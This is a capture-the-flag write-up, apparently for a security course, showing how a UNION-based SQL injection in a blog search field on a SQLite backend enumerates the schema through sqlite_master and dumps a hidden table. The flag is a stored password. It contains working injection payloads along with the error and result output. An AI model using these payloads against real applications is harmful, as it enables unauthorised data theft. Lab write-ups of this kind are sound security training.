# Challenge `Wow, it can't be more juicy than this!` writeup

* **Flag:** `SSof{Never_understimate_the_power_of_the_UNION}`
* **Vulnerability:** SQL Injection (UNION-based SQL Injection)
* **Where:** Blog post search input on the landing page
* **Impact:** Allows enumeration of database schema and extraction of hidden data, including unreleased secret blog posts and sensitive information.
* **NOTE:** The backend uses SQLite, which exposes schema metadata through the `sqlite_master` table, making database structure discovery possible once SQL injection is available.

---

## Steps to reproduce

1. Navigate to the landing page blog post search input, which is vulnerable to SQL Injection.

2. Since the goal is to locate hidden or unreleased information, I assumed that the secret was stored in the database.

3. Knowing the database engine is SQLite, attempt to enumerate table names by querying the `sqlite_master` table with the following payload:

```sql
' UNION SELECT sql FROM sqlite_master WHERE type='table'; --
```

4. This results in an error indicating a column count mismatch:

```
(sqlite3.OperationalError) SELECTs to the left and right of UNION do not have the same number of result columns [SQL: SELECT id, title, content FROM blog_post WHERE title LIKE '%' UNION SELECT sql FROM sqlite_master WHERE type='table'; --%' OR content LIKE '%' UNION SELECT sql FROM sqlite_master WHERE type='table'; --%'] (Background on this error at: https://sqlalche.me/e/14/e3q8)
```

From the backend error message, it is clear that the original query returns three columns:

```
SELECT id, title, content FROM blog_post ...
```

5. Adjust the payload to return three columns, matching expected types (I assumed `id` was an integer and `title` and `content` were text):

```sql
' UNION SELECT 1, name, sql FROM sqlite_master WHERE type='table'; --
```

6. The response now includes database table names and their creation SQL. Among them, a previously unknown table appears:

```
secret_blog_post
CREATE TABLE secret_blog_post ( id INTEGER NOT NULL, title TEXT, content TEXT, PRIMARY KEY (id), UNIQUE (title) )
```

7. Dump the contents of the discovered table using another UNION-based injection:

```sql
' UNION SELECT id, title, content FROM secret_blog_post; --
```

8. The search results display the contents of the hidden table, revealing a secret blog post:

```
Reminder
In case I forget my password is: SSof{Never_understimate_the_power_of_the_UNION}
```